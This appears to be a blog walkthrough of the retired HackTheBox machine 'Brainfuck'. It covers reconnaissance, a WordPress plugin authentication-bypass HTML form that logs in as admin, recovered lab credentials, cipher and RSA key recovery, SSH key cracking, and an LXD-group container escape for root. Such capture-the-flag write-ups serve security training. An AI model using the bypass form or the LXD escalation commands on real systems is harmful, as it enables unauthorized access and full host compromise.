---
title: Brainfuck - HackTheBox Walkthrough
author: Degr4ne
date: 2021-10-11 12:00:00 
categories: [HackTheBox,Linux]
tags: [wordpress,rsa,lxd]
math: false
mermaid: false
image:
  src: /assets/img/HTB/BrainFuck/00-banner.png
  width: 588
  height: 361
---
Hello guys, welcome back with another walkthrough, this time we'll be doing `Brainfuck` a retired machine by HackTheBox rated insane. Without further ado, let’s begin.

# Recon

## Nmap Scan

As always we'll start with a nmap scan to discover the open ports and services.

```console
$ cat nmap-scan
# Nmap 7.91 scan initiated Thu Oct  7 08:35:48 2021 as: nmap -sC -sV -v -oN nmap-scan 10.129.1.1
Nmap scan report for brainfuck.htb (10.129.1.1)
Host is up (0.13s latency).
Not shown: 995 filtered ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 94:d0:b3:34:e9:a5:37:c5:ac:b9:80:df:2a:54:a5:f0 (RSA)
|   256 6b:d5:dc:15:3a:66:7a:f4:19:91:5d:73:85:b2:4c:b2 (ECDSA)
|_  256 23:f5:a3:33:33:9d:76:d5:f2:ea:69:71:e3:4e:8e:02 (ED25519)
25/tcp  open  smtp?
|_smtp-commands: Couldn't establish connection on port 25
110/tcp open  pop3     Dovecot pop3d
|_pop3-capabilities: CAPA SASL(PLAIN) USER RESP-CODES AUTH-RESP-CODE PIPELINING TOP UIDL
143/tcp open  imap     Dovecot imapd
|_imap-capabilities: have listed more LITERAL+ IMAP4rev1 post-login SASL-IR ENABLE Pre-login capabilities IDLE OK ID AUTH=PLAINA0001 LOGIN-REFERRALS
443/tcp open  ssl/http nginx 1.10.0 (Ubuntu)
|_http-generator: WordPress 4.7.3
| http-methods:
|_  Supported Methods: GET HEAD POST
|_http-server-header: nginx/1.10.0 (Ubuntu)
|_http-title: 400 The plain HTTP request was sent to HTTPS port
| ssl-cert: Subject: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR
| Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb
| Issuer: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR
| Public Key type: rsa
| Public Key bits: 3072
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2017-04-13T11:19:29
| Not valid after:  2027-04-11T11:19:29
| MD5:   cbf1 6899 96aa f7a0 0565 0fc0 9491 7f20
|_SHA-1: f448 e798 a817 5580 879c 8fb8 ef0e 2d3d c656 cb66
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
| tls-nextprotoneg:
|_  http/1.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Looking at the nmap scan we see five ports are open, 3 of them are mail protocols(smtp, pop3, imap) so we need creedential to a complete enumeration, but from this scan we get 2 hostnames.
- brainfuck.htb
- sup3rs3cr3t.brainfuck.htb

Let's add this line to `/etc/hosts` file.
``` text
10.129.1.1 sup3rs3cr3t.brainfuck.htb brainfuck.htb
```
## HTTPS Enumeration
The first web is a WordPress site.

![01-web](/assets/img/HTB/BrainFuck/01-web.png)

And the second, it's a forum called `Super Secret`.

![02-web](/assets/img/HTB/BrainFuck/02-web.png)

With a quick view we get 2 potencial users:
- admin
- orestis

The version of the WordPress is not vulnerable to any potencial access but it seems that there a plugin installed `WP Support Plus Responsive Ticked System`.

![03-plugin](/assets/img/HTB/BrainFuck/03-plugin.png)

And the version of it, is vulnerable to a privilage escalation and a SQL injection.

![04-version](/assets/img/HTB/BrainFuck/04-version.png)
![05-vulns](/assets/img/HTB/BrainFuck/05-vulns.png)

With the [privilage escalation](https://security.szurek.pl/en/wp-support-plus-responsive-ticket-system-713-privilege-escalation/) we can loggin with any user, just need run this html file in our browser:

```html
<form method="post" action="https://brainfuck.htb/wp-admin/admin-ajax.php">
	Username: <input type="text" name="username" value="admin">
	<input type="hidden" name="email" value="sth">
	<input type="hidden" name="action" value="loginGuestFacebook">
	<input type="submit" value="Login">
</form>
```

Clicking in login to access like the user `admin`.

![06-file](/assets/img/HTB/BrainFuck/06-file.png)

And refresh the `brainfuck.htb` page.

![07-web](/assets/img/HTB/BrainFuck/07-web.png)

The first thing to try when we access to a WordPress site is modify a `theme` or a `plugin` to get a reverse shell but in this case none of them works, it was there when I found other plugin installed `Easy WP SMTP`.

![08-plugin](/assets/img/HTB/BrainFuck/08-plugin.png)

Going to the settings part, we look that the SMTP username and the password fields are filled, to see the password we just need inspect that element.

![09-passwd](/assets/img/HTB/BrainFuck/09-passwd.png)

Username | Password
-|-
orestis| kHGuERB29DNiNE

## POP3 Enumeration

As we see in the screenshot below, this crendencial works in pop3 and there 2 messages, one of this gives us a new credential to the `secret forum`.

List of [commands](http://sunnyoasis.com/services/emailviatelnet.html) using telnet to connect POP server.

![10-telnet](/assets/img/HTB/BrainFuck/10-telnet.png)

**Secret forum credencial:**

Username | Password
-|-
orestis| kIEnnfEKJ#9UmdO

# Initial Foothold

![11-web](/assets/img/HTB/BrainFuck/11-web.png)

First, let’s take a look at **SSH Access** thread.

![12-forum](/assets/img/HTB/BrainFuck/12-forum.png)

Apparently Orestis needs his SSH Key and wants to the admin send to him the key on an encrypted thread. It should be noted that Orestis always signs the end of his comment with the same phrase `Orestis - Hacking for fun and profit`.

The encrypted thread is called `Key`, from the next image we deduce that the admin is sending him an url and it seems Orestis is signing with the same phrase.

![13-encrypt](/assets/img/HTB/BrainFuck/13-encrypt.png)

Having the plaintext and the ciphert text, we can discover the key

```text
ciphert text -> Pieagnm - Jkoijeg nbw zwx mle grwsnn
plaintext    -> Orestis - Hacking for fun and profit
```

Using this [site](http://rumkin.com/tools/cipher/vigenere.php), we get the key: `fuckmybrain`

![14-cipher](/assets/img/HTB/BrainFuck/14-cipher.png)

# Getting User Shell

Once we know it, is easy [decode](http://icyberchef.com/#recipe=Vigen%C3%A8re_Decode('fuCkmybrain')) the url.

![15-url](/assets/img/HTB/BrainFuck/15-url.png)

Downloading the RSA key, and changing its permission to 600 with `chmod 600 id_rsa`.

![16-idrsa](/assets/img/HTB/BrainFuck/16-idrsa.png)

The id_rsa required a password. To crack it we can use `ssh2john`.

![17-crack](/assets/img/HTB/BrainFuck/17-crack.png)

The password was cracked!!! : `3poulakia!`, let's use it.

![18-ssh](/assets/img/HTB/BrainFuck/18-ssh.png)

# Privilage Escalation

## Root flag
Listing the files of orestis's home directory, we get 3 interestings things: `encrypt.sage`, `debug.txt` and `output.txt`.

![19-ls](/assets/img/HTB/BrainFuck/19-ls.png)

The content of encrypt.sage :

```python
nbits = 1024
password = open("/root/root.txt").read().strip()
enc_pass = open("output.txt","w")
debug = open("debug.txt","w")
m = Integer(int(password.encode('hex'),16))
p = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False)
q = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False)
n = p*q
phi = (p-1)*(q-1)
e = ZZ.random_element(phi)
while gcd(e, phi) != 1:
    e = ZZ.random_element(phi)
c = pow(m, e, n)
enc_pass.write('Encrypted Password: '+str(c)+'\n')
debug.write(str(p)+'\n')
debug.write(str(q)+'\n')
debug.write(str(e)+'\n')
```

Doing a little research, I could find a rsa [decrypt](http://dann.com.br/alexctf2k17-crypto150-what_is_this_encryption/), we just need copy his script and change the value of p,q,e and ct with the values in `debug.txt`(p,q,e) and `output.txt`(ct).

![20-script](/assets/img/HTB/BrainFuck/20-script.png)

Once it's done just run the script and we get back the root.txt flag.

![21-flag](/assets/img/HTB/BrainFuck/21-flag.png)

We got the flag but we are not root.

## Getting root shell

With `id` I noticed we are a member of lxd group

![22-id](/assets/img/HTB/BrainFuck/22-id.png)

```console
$ git clone https://github.com/saghul/lxd-alpine-builder
$ cd lxd-alpine-builder
$ sudo ./build-alpine -a i686
```

Running above commands in our attack machine, rename the obtained file to `alpine.tar.gz` and transfer it to the victim machine.

![23-lxd](/assets/img/HTB/BrainFuck/23-lxd.png)

Use this commands on the victim machine to create a mount on `/mnt/root`

```console
$ lxc image import ./alpine.tar.gz --alias alpine
$ lxc image list
$ lxc init alpine privesc -c security.privileged=true
$ lxc list
$ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
$ lxc start privesc
$ lxc exec privesc /bin/sh
```
![24-lxd](/assets/img/HTB/BrainFuck/24-lxd.png)

Once inside the container, go to `/mnt/root/root` to see the flag.

![25-flag](/assets/img/HTB/BrainFuck/25-flag.png)

That’s it for now guys. Until next time.
